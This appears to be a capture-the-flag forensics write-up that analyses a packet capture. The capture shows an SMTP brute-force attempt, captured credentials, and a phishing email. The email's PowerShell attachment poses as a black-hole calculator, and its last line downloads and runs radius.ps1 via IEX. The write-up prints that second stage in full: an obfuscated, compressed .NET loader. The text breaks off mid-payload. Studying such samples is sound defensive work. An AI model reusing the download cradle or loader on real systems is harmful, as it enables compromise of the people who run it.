## Description

Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.

**Note**

- There are files that are available to download.

<img width="787" height="196" alt="image" src="https://github.com/user-attachments/assets/70dde0df-8e28-4ce1-9b65-3955858f4cfc" />

- **powershell.DMP** is a dump file, a snapshot of a data saved to disk.
- **traffic.pcapng** is a network packet capture.

## Questions

The questions for this task are - 

<img width="1140" height="611" alt="image" src="https://github.com/user-attachments/assets/3eb76dd7-d7c6-4049-98e1-52b8fee1f7b6" />

## Analysis

### traffic.pcapng

<img width="952" height="511" alt="image" src="https://github.com/user-attachments/assets/85ebae6e-322f-4a97-8782-f1d0539e5ce1" />


the section above look like a bruteforce attack trying to get access to the email address.

<img width="781" height="557" alt="image" src="https://github.com/user-attachments/assets/888ac82f-1494-4fee-8172-a319093f2149" />


there are various email addresses that are targeted. 

but they all resulted in failure. 

<img width="740" height="532" alt="image" src="https://github.com/user-attachments/assets/6cf52c60-3dc6-4c22-a2da-cdb31e9e1470" />


<img width="965" height="528" alt="image" src="https://github.com/user-attachments/assets/f1ec6776-12f3-4858-91b8-0388abf0b6b6" />


using SMTP 

<img width="1309" height="380" alt="image" src="https://github.com/user-attachments/assets/e5c76706-0a47-4dae-b7b1-37cd0af0e201" />

```html
220 mail.eventhorizon.thm ESMTP

EHLO kali

250-mail.eventhorizon.thm
250-SIZE 20480000
250-AUTH LOGIN
250 HELP

AUTH LOGIN

334 VXNlcm5hbWU6

dG9tLmRvbUBldmVudGhvcml6b24udGht

334 UGFzc3dvcmQ6

cGFzc3dvcmQ=

235 authenticated.

MAIL FROM:<tom.dom@eventhorizon.thm>

250 OK

RCPT TO:<dom.mark@eventhorizon.thm>

250 OK

DATA

354 OK, send.

Message-ID: <830733.649755956-sendEmail@kali>
From: "tom.dom@eventhorizon.thm" <tom.dom@eventhorizon.thm>
To: "dom.mark@eventhorizon.thm" <dom.mark@eventhorizon.thm>
Subject: Event Horizon
Date: Tue, 27 Aug 2024 06:36:41 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----MIME delimiter for sendEmail-633366.747832955"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-633366.747832955
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm

------MIME delimiter for sendEmail-633366.747832955
Content-Type: application/octet-stream;
        name="eventhorizon.ps1"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="eventhorizon.ps1"

IyBDb25zdGFudHMKJEcgPSA2LjY3NDMwZS0xMSAgIyBHcmF2aXRhdGlvbmFsIGNvbnN0YW50ICht
XjMga2deLTEgc14tMikKJEMgPSAyOTk3OTI0NTggICAgIyBTcGVlZCBvZiBsaWdodCAobS9zKQok
c29sYXJNYXNzID0gMS45ODllMzAgICMgTWFzcyBvZiB0aGUgU3VuIChrZykKCiMgRnVuY3Rpb24g
dG8gY2FsY3VsYXRlIHRoZSBTY2h3YXJ6c2NoaWxkIHJhZGl1cyBvZiBhIGJsYWNrIGhvbGUKZnVu
Y3Rpb24gR2V0LVNjaHdhcnpzY2hpbGRSYWRpdXMgewogICAgcGFyYW0gKAogICAgICAgIFtkb3Vi
bGVdJG1hc3MgICMgTWFzcyBvZiB0aGUgYmxhY2sgaG9sZSAoa2cpCiAgICApCiAgICByZXR1cm4g
KDIgKiAkRyAqICRtYXNzKSAvICgkQyAqICRDKQp9CgojIEZ1bmN0aW9uIHRvIGNhbGN1bGF0ZSB0
aGUgbWFzcyBvZiBhIGJsYWNrIGhvbGUgZ2l2ZW4gaXRzIHJhZGl1cwpmdW5jdGlvbiBHZXQtQmxh
Y2tIb2xlTWFzcyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2RvdWJsZV0kcmFkaXVzICAjIFJhZGl1
cyBvZiB0aGUgYmxhY2sgaG9sZSAobSkKICAgICkKICAgIHJldHVybiAoJHJhZGl1cyAqICRDICog
JEMpIC8gKDIgKiAkRykKfQoKIyBHaXZlbiByYWRpdXMgb2YgdGhlIFN1biAoYXBwcm94aW1hdGUp
CiRzdW5SYWRpdXMgPSA2Ljk2MzQyZTggICMgUmFkaXVzIG9mIHRoZSBTdW4gKG1ldGVycykKCiMg
Q2FsY3VsYXRlIHRoZSBtYXNzIG9mIGEgYmxhY2sgaG9sZSB3aXRoIHRoZSBzYW1lIHJhZGl1cyBh
cyB0aGUgU3VuCiRibGFja0hvbGVNYXNzID0gR2V0LUJsYWNrSG9sZU1hc3MgLXJhZGl1cyAkc3Vu
UmFkaXVzCgojIERpc3BsYXkgcmVzdWx0cwpXcml0ZS1PdXRwdXQgIlRoZSBtYXNzIG9mIGEgYmxh
Y2sgaG9sZSBCQiB3aGljaCBoYXMgdGhlIHNhbWUgcmFkaXVzIGFzIHRoZSBTdW4gaXMgYXBwcm94
aW1hdGVseSAkKCRibGFja0hvbGVNYXNzLzFlMzApIHNvbGFyIG1hc3Nlcy4iCldyaXRlLU91dHB1
dCAiSW4ga2lsb2dyYW1zLCB0aGlzIGlzIGFwcHJveGltYXRlbHkgJGJsYWNrSG9sZU1hc3Mga2cu
IgoKSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8x
MC4wLjIuNDUvcmFkaXVzLnBzMScpCg==

------MIME delimiter for sendEmail-633366.747832955--

.

250 Queued (1.079 seconds)

QUIT

221 goodbye

```

This is the whole stream.

it seems like 

```html
Username:tom.dom@eventhorizon.thm
Password:password
```

```html
# Constants
$G = 6.67430e-11  # Gravitational constant (m^3 kg^-1 s^-2)
$C = 299792458    # Speed of light (m/s)
$solarMass = 1.989e30  # Mass of the Sun (kg)

# Function to calculate the Schwarzschild radius of a black hole
function Get-SchwarzschildRadius {
    param (
        [double]$mass  # Mass of the black hole (kg)
    )
    return (2 * $G * $mass) / ($C * $C)
}

# Function to calculate the mass of a black hole given its radius
function Get-BlackHoleMass {
    param (
        [double]$radius  # Radius of the black hole (m)
    )
    return ($radius * $C * $C) / (2 * $G)
}

# Given radius of the Sun (approximate)
$sunRadius = 6.96342e8  # Radius of the Sun (meters)

# Calculate the mass of a black hole with the same radius as the Sun
$blackHoleMass = Get-BlackHoleMass -radius $sunRadius

# Display results
Write-Output "The mass of a black hole BB which has the same radius as the Sun is approximately $($blackHoleMass/1e30) solar masses."
Write-Output "In kilograms, this is approximately $blackHoleMass kg."

IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')

```

most of the script is some calculation but the last line downloads `radius.ps1`  

So the first stage is the `eventhorizons.ps1` and the second stage is `radius.ps1` .

<img width="1391" height="395" alt="image" src="https://github.com/user-attachments/assets/7a1c5b63-087d-40aa-bb8b-bcc5a524c7bd" />

by the looks of it, the second stage was executed.

```html
GET /radius.ps1 HTTP/1.1
Host: 10.0.2.45
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.9
Date: Tue, 27 Aug 2024 06:37:13 GMT
Content-type: application/octet-stream
Content-Length: 7466
Last-Modified: Tue, 27 Aug 2024 05:37:39 GMT

sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null

```

so to decode/ deobfuscating it

```html
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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